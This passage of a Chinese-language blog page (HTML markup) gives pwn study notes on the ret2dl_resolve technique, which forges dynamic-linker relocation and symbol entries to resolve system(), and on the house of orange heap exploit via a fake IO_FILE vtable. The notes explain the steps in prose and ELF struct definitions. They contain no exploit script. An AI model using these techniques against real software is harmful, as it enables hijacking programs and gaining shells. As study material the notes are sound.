+<p>这个漏洞原理是利用了程序动态链接相关知识，在程序中对一些调用动态链接库函数的got地址会在第一次调用时使用_dl_runtime_resolve函数来获取动态链接库对应函数的实际地址然后填充到got表处，调用该函数时会传递两个参数link_map和.rel.plt的偏移位置reloc_arg，link_map包含了.dynamic的指针<br><img src="/2019/05/10/pwn易忘操作原理笔记/3.png" alt="ida"><br>该漏洞主要关注里面的三个指针地址DT_STRTAB,DT_SYMTAB,DT_JMPREL,这三个指针分别指向.dynstr（字符串表）、.dynsym（符号表）、.rel.plt（重定位表），_dl_runtime_resolve的步骤大致如下：</p>
+<p>1.通过link_map找到.dynamic的地址,然后通过.dynamic的地址获取到.dynstr,.dynsym,.rel.plt的地址</p>
+<p>2.用.rel.plt的地址加上第二个参数reloc_arg取得动态链接库函数在重定位表中的表项，.rel.plt的结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p>
+<p>3.通过rel的r_info字段&gt;&gt;8来获得.dynsym的偏移，.dynsym的结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure></p>
+<p>4.通过sym的st_name字段(这个字段是动态链接库函数在.dynstr的偏移位置)来找到.dynstr对应的字符串位置</p>
+<p>5.在动态链接库中找该函数的实际地址并赋值给got表地址处</p>
+<p>6.调用这个函数</p>
+<p>利用手段：修改reloc_arg让.rel.plt+reloc_arg的地址在可控地址处来获取可控的r_info，通过r_info&gt;&gt;8+.dynsym的地址来将符号表地址修改到可控地址处sym，再通过.dynstr+sym指向可控地址获取字符串信息system，从而将system函数的地址写到其它函数的got表处，第一次调用该函数相当于调用了system函数。</p>
+<p>三、house of orange</p>
+<p> 这个堆溢出的利用方式使用到的知识点比较多io_file,unsortedbin attack,top_chunk attack等。</p>
+<p>1.利用堆溢出修改top_chunk的size然后去申请一个大于size的chunk，这里会把top_chunk放到unsortedbin里然后在后面重新建一个新的top_chunk，需要满足以下几个条件：</p>
+<p>（1）申请的大小要大于MINSIZE</p>
+<p>（2）申请的大小要小于128*1024</p>
+<p>（3）改后的top_chunk的size要页对齐(top_chunk+size(top_chunk)是0x1000的倍数)</p>
+<p>（4）申请的大小+MINSIZE要大于top_chunk的size</p>
+<p>2.再申请一个chunk会分割unsortedbin可以获得libc地址</p>
+<p>3.修改剩下的unsorted_bin的size为0x60,bk为_IO_list_all-0x10，这样下一次申请一个chunk(大于0x60)时，会触发unsortedbin attack，将bk+0x10也就是_IO_list_all的值改为unsorted_bin的地址，由于我们无法控制main_arena附近的地址，所以我们考虑使用fp-&gt;chain来跳到下一个file结构体，这个结构体是我们可以控制的地址，fp-&gt;chain是偏移0x60的位置，正好是smallbin[6]的位置，所以之前把size改为0x60，这样unsortedbin会放入smallbin对应大小的地方也就是smallbin[6]的位置，现在smallbin[6]的位置就是之前top_chunk剩余的地址，那一块地址的内容可以事先构建好IO_FILE结构和vtable的地址</p>
+<p>4.触发malloc报错，进入libc_message调用abort，abort调用_IO_flush_all_lockp，是IO_FIle vtable里面的内容，由于第一个IO_FILE_ALL的fp-&gt;mode不符合判断条件，所以会执行fp=fp-&gt;chain到达我们旧的top_chunk剩余的地址处，然后就会执行那个vtable中的函数，事先将该函数地址改为one_gadget即可获得shell。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-pwn学习之四" class="article article-type-post" itemscope itemprop="blogPost">
   
